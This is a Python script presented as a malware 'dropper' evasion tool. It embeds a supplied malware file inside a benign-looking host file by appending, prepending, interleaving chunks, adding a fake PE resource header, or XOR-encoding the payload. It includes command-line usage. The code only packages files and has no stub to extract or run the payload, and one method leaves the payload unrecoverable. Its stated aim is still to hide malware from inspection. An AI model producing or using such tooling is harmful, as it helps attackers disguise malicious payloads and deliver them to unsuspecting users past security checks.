#!/usr/bin/env python3
"""
Evasion Technique: Employing Droppers
Embed malicious payload inside a benign-looking executable.
"""

import struct
import random
from pathlib import Path

def create_simple_dropper(malware_file, benign_file, output_file, method='append'):
    """
    Create a dropper by embedding malware in a benign file.
    
    Args:
        malware_file: Path to malware payload
        benign_file: Path to benign host file
        output_file: Path to output dropper
        method: Embedding method ('append', 'prepend', 'resource')
    
    Returns:
        dict with dropper info
    """
    malware_path = Path(malware_file)
    benign_path = Path(benign_file)
    output_path = Path(output_file)
    
    # Read files
    with open(malware_path, 'rb') as f:
        malware_data = f.read()
    
    with open(benign_path, 'rb') as f:
        benign_data = f.read()
    
    if method == 'append':
        # Append malware to benign file with a marker
        marker = b'PAYLOAD_START_MARKER_' + bytes([random.randint(0, 255) for _ in range(8)])
        dropper_data = benign_data + marker + malware_data
        
        with open(output_path, 'wb') as f:
            f.write(dropper_data)
        
        return {
            'technique': 'dropper_append',
            'benign_source': str(benign_file),
            'benign_size': len(benign_data),
            'payload_size': len(malware_data),
            'marker': marker.hex(),
            'total_size': len(dropper_data),
            'method': 'append'
        }
    
    elif method == 'prepend':
        # Prepend malware before benign file
        marker = b'END_PAYLOAD_MARKER_' + bytes([random.randint(0, 255) for _ in range(8)])
        dropper_data = malware_data + marker + benign_data
        
        with open(output_path, 'wb') as f:
            f.write(dropper_data)
        
        return {
            'technique': 'dropper_prepend',
            'benign_source': str(benign_file),
            'benign_size': len(benign_data),
            'payload_size': len(malware_data),
            'marker': marker.hex(),
            'total_size': len(dropper_data),
            'method': 'prepend'
        }
    
    elif method == 'interleave':
        # Interleave malware chunks between benign data
        chunk_size = 1024
        dropper_data = bytearray()
        
        benign_chunks = [benign_data[i:i+chunk_size] for i in range(0, len(benign_data), chunk_size)]
        malware_chunks = [malware_data[i:i+chunk_size] for i in range(0, len(malware_data), chunk_size)]
        
        # Interleave chunks
        max_chunks = max(len(benign_chunks), len(malware_chunks))
        for i in range(max_chunks):
            if i < len(benign_chunks):
                dropper_data.extend(benign_chunks[i])
            if i < len(malware_chunks):
                dropper_data.extend(malware_chunks[i])
        
        with open(output_path, 'wb') as f:
            f.write(dropper_data)
        
        return {
            'technique': 'dropper_interleave',
            'benign_source': str(benign_file),
            'benign_size': len(benign_data),
            'payload_size': len(malware_data),
            'total_size': len(dropper_data),
            'method': 'interleave',
            'chunk_size': chunk_size
        }
    
    else:
        return {
            'error': f'Unknown method: {method}'
        }

def create_pe_resource_dropper(malware_file, benign_pe_file, output_file):
    """
    Embed malware in PE resource section (simplified).
    This is a basic implementation that appends to the file.
    """
    malware_path = Path(malware_file)
    benign_path = Path(benign_pe_file)
    output_path = Path(output_file)
    
    # Read files
    with open(malware_path, 'rb') as f:
        malware_data = f.read()
    
    with open(benign_path, 'rb') as f:
        benign_data = f.read()
    
    # Create fake resource section
    # In a real implementation, this would properly modify PE sections
    resource_header = struct.pack('<I', len(malware_data))  # Size of resource
    resource_header += b'RSRC'  # Marker
    
    dropper_data = benign_data + resource_header + malware_data
    
    with open(output_path, 'wb') as f:
        f.write(dropper_data)
    
    return {
        'technique': 'dropper_pe_resource',
        'benign_source': str(benign_pe_file),
        'benign_size': len(benign_data),
        'payload_size': len(malware_data),
        'total_size': len(dropper_data),
        'method': 'pe_resource'
    }

def create_xor_encoded_dropper(malware_file, benign_file, output_file, xor_key=None):
    """
    Create dropper with XOR-encoded payload.
    
    Args:
        malware_file: Path to malware payload
        benign_file: Path to benign host file
        output_file: Path to output dropper
        xor_key: XOR key (byte), or None for random
    
    Returns:
        dict with dropper info
    """
    malware_path = Path(malware_file)
    benign_path = Path(benign_file)
    output_path = Path(output_file)
    
    # Read files
    with open(malware_path, 'rb') as f:
        malware_data = f.read()
    
    with open(benign_path, 'rb') as f:
        benign_data = f.read()
    
    # Generate XOR key if not provided
    if xor_key is None:
        xor_key = random.randint(1, 255)
    
    # XOR encode the malware
    encoded_malware = bytes([b ^ xor_key for b in malware_data])
    
    # Create dropper with encoded payload
    marker = b'XOR_PAYLOAD_'
    key_marker = struct.pack('B', xor_key)
    size_marker = struct.pack('<I', len(encoded_malware))
    
    dropper_data = benign_data + marker + key_marker + size_marker + encoded_malware
    
    with open(output_path, 'wb') as f:
        f.write(dropper_data)
    
    return {
        'technique': 'dropper_xor_encoded',
        'benign_source': str(benign_file),
        'benign_size': len(benign_data),
        'payload_size': len(malware_data),
        'encoded_size': len(encoded_malware),
        'xor_key': xor_key,
        'total_size': len(dropper_data),
        'method': 'xor_encoded'
    }

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 4:
        print("Usage: python dropper.py <malware_file> <benign_file> <output_file> [method]")
        print("Methods: append, prepend, interleave, resource, xor")
        sys.exit(1)
    
    malware_file = sys.argv[1]
    benign_file = sys.argv[2]
    output_file = sys.argv[3]
    method = sys.argv[4] if len(sys.argv) > 4 else "append"
    
    if method == "resource":
        result = create_pe_resource_dropper(malware_file, benign_file, output_file)
    elif method == "xor":
        result = create_xor_encoded_dropper(malware_file, benign_file, output_file)
    else:
        result = create_simple_dropper(malware_file, benign_file, output_file, method)
    
    if 'error' in result:
        print(f"Error: {result['error']}")
        sys.exit(1)
    
    print(f"Dropper created: {output_file}")
    print(f"Technique: {result['technique']}")
    print(f"Benign source: {result['benign_source']}")
    print(f"Benign size: {result['benign_size']} bytes")
    print(f"Payload size: {result['payload_size']} bytes")
    print(f"Total size: {result['total_size']} bytes")
    
    if 'xor_key' in result:
        print(f"XOR key: {result['xor_key']}")

